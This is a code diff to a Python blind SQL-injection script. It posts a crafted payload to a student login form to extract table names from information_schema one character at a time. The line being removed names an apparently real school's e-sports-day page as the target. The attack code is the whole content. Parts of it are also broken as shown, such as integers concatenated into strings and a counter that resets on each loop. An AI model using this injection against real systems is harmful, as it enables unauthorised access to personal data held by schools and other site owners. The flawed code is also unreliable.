@@ -16,9 +16,9 @@ IsFinish = False
 while not IsFinish:
     i=1
     for letter in alphabet:
-        injection = "a' OR IF(HEX("+letter+")=HEX((SELECT SUBSTRING(table_name,"+i+","+i+") AS ExtractString FROM information_schema.tables LIMIT 1 OFFSET "+i-1+")),1,'a'); -- "
+        injection = "a' OR IF(HEX("+letter+")=HEX((SELECT SUBSTRING(table_name,"+i+",1) AS ExtractString FROM information_schema.tables LIMIT 1 OFFSET "+i-1+")),1,'a'); -- "
         response = requests.post(
-            'https://aos.ssc.edu.hk/aos/e-sportsday/student/index.php',
+            url,
             cookies=cookies,
             data={
             'input_unique_id': injection,
